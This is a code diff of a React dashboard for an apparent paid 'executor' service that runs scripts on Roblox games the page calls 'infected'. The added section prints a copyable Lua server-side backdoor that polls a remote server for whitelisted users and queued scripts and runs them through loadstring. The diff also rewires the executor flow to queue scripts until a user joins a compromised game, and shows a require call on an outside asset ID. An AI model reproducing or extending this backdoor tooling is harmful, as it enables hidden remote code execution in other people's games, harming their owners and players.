@@ -203,7 +203,6 @@ export default function DashboardPage() {
   const [whitelistKeys, setWhitelistKeys] = useState<WhitelistKey[]>([])
   const [keyInput, setKeyInput] = useState("")
   const [robloxWebhookUrl, setRobloxWebhookUrl] = useState("")
-  const [selectedGame, setSelectedGame] = useState<string>("")
   const [scriptInput, setScriptInput] = useState("")
   const [executorLoading, setExecutorLoading] = useState(false)
   const [scriptLogs, setScriptLogs] = useState<ScriptLog[]>([])
@@ -410,16 +409,20 @@ setChatLoading(false)
 
   // Execute script
   const executeScript = async (scriptType?: "r6") => {
-    if (!user || !selectedGame) {
-      showToast("Please select a game first", "error")
+    if (!user) {
+      showToast("Please log in first", "error")
       return
     }
-    if (!user.robloxUsername) {
-      showToast("You need to link your Roblox account first", "error")
-      return
-    }
+    
+    // Check plan first - show message if no plan
     if (userPlan === "none") {
-      showToast("You need an active plan to use the executor", "error")
+      showToast("You need an active plan to use the executor. Go to Whitelist to redeem a key.", "error")
+      return
+    }
+    
+    // Check roblox link
+    if (!user.robloxUsername) {
+      showToast("You need to link your Roblox account first. Go to Whitelist.", "error")
       return
     }
 
@@ -441,15 +444,14 @@ setChatLoading(false)
         body: JSON.stringify({
           username: user.username,
           script,
-          gameId: selectedGame,
         }),
       })
       const data = await res.json()
       if (data.success) {
-        showToast("Script executed!", "success")
+        showToast("Script queued! Will execute when you're found in a game.", "success")
         if (!scriptType) setScriptInput("")
       } else {
-        showToast(data.error || "Failed to execute script", "error")
+        showToast(data.error || "Failed to queue script", "error")
       }
     } catch {
       showToast("Something went wrong", "error")
@@ -1002,7 +1004,7 @@ setChatLoading(false)
 const sidebarItems = [
     { id: "home" as Tab, label: "Home", icon: Home },
     { id: "games" as Tab, label: "Games", icon: Gamepad2 },
-    ...(hasAccess ? [{ id: "executor" as Tab, label: "Executor", icon: Terminal }] : []),
+    { id: "executor" as Tab, label: "Executor", icon: Terminal },
     { id: "chat" as Tab, label: "Chat", icon: MessageCircle },
     { id: "whitelist" as Tab, label: "Whitelist", icon: Key },
     { id: "tos" as Tab, label: "ToS", icon: FileText },
@@ -1566,86 +1568,54 @@ const sidebarItems = [
                 <p className="text-muted-foreground mt-1">Execute scripts on infected games</p>
               </div>
 
-              {!hasAccess ? (
-                <div className="glass rounded-xl border border-yellow-500/30 p-6 text-center">
-                  <AlertTriangle className="h-12 w-12 text-yellow-500 mx-auto mb-3" />
-                  <h3 className="text-lg font-semibold text-foreground mb-2">Plan Required</h3>
-                  <p className="text-muted-foreground">You need an active plan to use the executor. Go to Whitelist to redeem a key.</p>
-                </div>
-              ) : !user?.robloxUsername ? (
-                <div className="glass rounded-xl border border-yellow-500/30 p-6 text-center">
-                  <Link2 className="h-12 w-12 text-yellow-500 mx-auto mb-3" />
-                  <h3 className="text-lg font-semibold text-foreground mb-2">Link Roblox Account</h3>
-                  <p className="text-muted-foreground">You need to link your Roblox account first. Go to Whitelist to link it.</p>
-                </div>
-              ) : (
-                <>
-                  {/* Game Selection */}
-                  <div className="glass rounded-xl border border-border/30 p-4">
-                    <label className="block text-sm font-medium text-foreground mb-2">Select Game</label>
-                    <select
-                      value={selectedGame}
-                      onChange={(e) => setSelectedGame(e.target.value)}
-                      className="w-full px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
-                    >
-                      <option value="">-- Select a game --</option>
-                      {games.filter(g => g.status === "online").map((game) => (
-                        <option key={game.id} value={game.id}>
-                          {game.name} ({formatPlayers(game.players)} players)
-                        </option>
-                      ))}
-                    </select>
-                  </div>
+              {/* Script Editor - Always show */}
+              <div className="glass rounded-xl border border-border/30 p-4">
+                <label className="block text-sm font-medium text-foreground mb-2">Script</label>
+                <textarea
+                  value={scriptInput}
+                  onChange={(e) => setScriptInput(e.target.value)}
+                  placeholder="Enter your Lua script here..."
+                  className="w-full h-48 px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50 font-mono text-sm resize-none"
+                />
+              </div>
 
-                  {/* Script Editor */}
-                  <div className="glass rounded-xl border border-border/30 p-4">
-                    <label className="block text-sm font-medium text-foreground mb-2">Script</label>
-                    <textarea
-                      value={scriptInput}
-                      onChange={(e) => setScriptInput(e.target.value)}
-                      placeholder="Enter your Lua script here..."
-                      className="w-full h-48 px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50 font-mono text-sm resize-none"
-                    />
-                  </div>
+              {/* Action Buttons */}
+              <div className="flex gap-3">
+                <button
+                  onClick={() => executeScript()}
+                  disabled={executorLoading}
+                  className="flex-1 py-3 rounded-lg bg-primary text-primary-foreground font-semibold hover:bg-primary/90 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                >
+                  {executorLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : <Play className="h-5 w-5" />}
+                  Execute
+                </button>
+                <button
+                  onClick={() => setScriptInput("")}
+                  className="px-6 py-3 rounded-lg bg-secondary border border-border/30 text-foreground font-semibold hover:bg-secondary/80 transition-all"
+                >
+                  Clear
+                </button>
+                <button
+                  onClick={() => executeScript("r6")}
+                  disabled={executorLoading}
+                  className="px-6 py-3 rounded-lg bg-green-500/20 border border-green-500/30 text-green-400 font-semibold hover:bg-green-500/30 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+                >
+                  R6
+                </button>
+              </div>
 
-                  {/* Action Buttons */}
-                  <div className="flex gap-3">
-                    <button
-                      onClick={() => executeScript()}
-                      disabled={executorLoading || !selectedGame || !scriptInput.trim()}
-                      className="flex-1 py-3 rounded-lg bg-primary text-primary-foreground font-semibold hover:bg-primary/90 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-                    >
-                      {executorLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : <Play className="h-5 w-5" />}
-                      Execute
-                    </button>
-                    <button
-                      onClick={() => setScriptInput("")}
-                      className="px-6 py-3 rounded-lg bg-secondary border border-border/30 text-foreground font-semibold hover:bg-secondary/80 transition-all"
-                    >
-                      Clear
-                    </button>
-                    <button
-                      onClick={() => executeScript("r6")}
-                      disabled={executorLoading || !selectedGame}
-                      className="px-6 py-3 rounded-lg bg-green-500/20 border border-green-500/30 text-green-400 font-semibold hover:bg-green-500/30 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-                    >
-                      R6
-                    </button>
-                  </div>
-
-                  {/* Info */}
-                  <div className="glass rounded-xl border border-border/30 p-4">
-                    <div className="flex items-start gap-3">
-                      <FileCode className="h-5 w-5 text-primary mt-0.5" />
-                      <div>
-                        <h4 className="font-medium text-foreground">R6 Script</h4>
-                        <p className="text-sm text-muted-foreground mt-1">
-                          The R6 button executes: <code className="px-1.5 py-0.5 bg-muted rounded text-xs font-mono">require(3436957371):r6("{user?.robloxUsername}")</code>
-                        </p>
-                      </div>
+              {/* Status Info */}
+              {user?.robloxUsername && hasAccess && (
+                <div className="glass rounded-xl border border-green-500/30 p-4 bg-green-500/5">
+                  <div className="flex items-center gap-3">
+                    <Check className="h-5 w-5 text-green-500" />
+                    <div>
+                      <p className="text-sm text-foreground">
+                        Scripts will be executed when <span className="font-semibold text-primary">{user.robloxUsername}</span> is found in an infected game.
+                      </p>
                     </div>
                   </div>
-                </>
+                </div>
               )}
             </div>
           )}
@@ -2569,6 +2539,144 @@ spawn(updatePlayers)`, "lua-script")}
                     >
                       {copied === "lua-script" ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                       Copy Script
+                    </button>
+                  </div>
+
+                  <div className="glass rounded-xl border border-primary/30 p-6 bg-primary/5">
+                    <h3 className="font-semibold text-foreground mb-4 flex items-center gap-2">
+                      <Terminal className="h-5 w-5 text-primary" />
+                      Executor Lua Script (IMPORTANT)
+                    </h3>
+                    <p className="text-sm text-muted-foreground mb-4">Copy this script to your infected Roblox game. It will check for whitelisted users and execute their queued scripts.</p>
+                    <div className="bg-[#1a1a2e] rounded-lg p-4 border border-border/30 overflow-x-auto max-h-96">
+                      <pre className="text-sm font-mono text-green-400 whitespace-pre-wrap">{`-- Moon Server-Side Executor
+-- Put this in ServerScriptService
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local WEBHOOK_URL = "${typeof window !== "undefined" ? window.location.origin : "YOUR_DOMAIN"}"
+local WEBHOOK_KEY = "${webhookKey || "YOUR_WEBHOOK_KEY"}"
+
+local WHITELIST_URL = WEBHOOK_URL .. "/api/whitelist?webhookKey=" .. WEBHOOK_KEY
+local EXECUTOR_URL = WEBHOOK_URL .. "/api/executor"
+
+local whitelistedUsers = {}
+local lastFetch = 0
+
+-- Fetch whitelist
+local function fetchWhitelist()
+    local s, r = pcall(function()
+        local res = HttpService:GetAsync(WHITELIST_URL)
+        return HttpService:JSONDecode(res)
+    end)
+    if s and type(r) == "table" then
+        whitelistedUsers = {}
+        for _, u in ipairs(r) do
+            whitelistedUsers[string.lower(u)] = true
+        end
+    end
+    lastFetch = tick()
+end
+
+-- Check whitelist
+local function isWhitelisted(plr)
+    return whitelistedUsers[string.lower(plr.Name)] == true
+end
+
+-- Execute scripts for player
+local function execScripts(plr)
+    if not isWhitelisted(plr) then return end
+    local url = EXECUTOR_URL .. "?webhookKey=" .. WEBHOOK_KEY .. "&robloxUser=" .. plr.Name .. "&action=fetch"
+    local s, r = pcall(function()
+        return HttpService:JSONDecode(HttpService:GetAsync(url))
+    end)
+    if s and r and r.scripts then
+        for _, script in ipairs(r.scripts) do
+            pcall(function() loadstring(script)() end)
+        end
+    end
+end
+
+-- Main loop
+spawn(function()
+    while true do
+        if tick() - lastFetch > 30 then fetchWhitelist() end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if isWhitelisted(p) then execScripts(p) end
+        end
+        wait(5)
+    end
+end)
+
+fetchWhitelist()
+Players.PlayerAdded:Connect(function() if tick() - lastFetch > 5 then fetchWhitelist() end end)
+print("[Moon] Executor loaded!")`}</pre>
+                    </div>
+                    <button
+                      onClick={() => copyToClipboard(`-- Moon Server-Side Executor
+-- Put this in ServerScriptService
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local WEBHOOK_URL = "${typeof window !== "undefined" ? window.location.origin : "YOUR_DOMAIN"}"
+local WEBHOOK_KEY = "${webhookKey || "YOUR_WEBHOOK_KEY"}"
+
+local WHITELIST_URL = WEBHOOK_URL .. "/api/whitelist?webhookKey=" .. WEBHOOK_KEY
+local EXECUTOR_URL = WEBHOOK_URL .. "/api/executor"
+
+local whitelistedUsers = {}
+local lastFetch = 0
+
+local function fetchWhitelist()
+    local s, r = pcall(function()
+        local res = HttpService:GetAsync(WHITELIST_URL)
+        return HttpService:JSONDecode(res)
+    end)
+    if s and type(r) == "table" then
+        whitelistedUsers = {}
+        for _, u in ipairs(r) do
+            whitelistedUsers[string.lower(u)] = true
+        end
+    end
+    lastFetch = tick()
+end
+
+local function isWhitelisted(plr)
+    return whitelistedUsers[string.lower(plr.Name)] == true
+end
+
+local function execScripts(plr)
+    if not isWhitelisted(plr) then return end
+    local url = EXECUTOR_URL .. "?webhookKey=" .. WEBHOOK_KEY .. "&robloxUser=" .. plr.Name .. "&action=fetch"
+    local s, r = pcall(function()
+        return HttpService:JSONDecode(HttpService:GetAsync(url))
+    end)
+    if s and r and r.scripts then
+        for _, script in ipairs(r.scripts) do
+            pcall(function() loadstring(script)() end)
+        end
+    end
+end
+
+spawn(function()
+    while true do
+        if tick() - lastFetch > 30 then fetchWhitelist() end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if isWhitelisted(p) then execScripts(p) end
+        end
+        wait(5)
+    end
+end)
+
+fetchWhitelist()
+Players.PlayerAdded:Connect(function() if tick() - lastFetch > 5 then fetchWhitelist() end end)
+print("[Moon] Executor loaded!")`, "executor-script")}
+                      className="mt-4 inline-flex items-center gap-2 rounded-lg bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-all"
+                    >
+                      {copied === "executor-script" ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
+                      Copy Executor Script
                     </button>
                   </div>
 
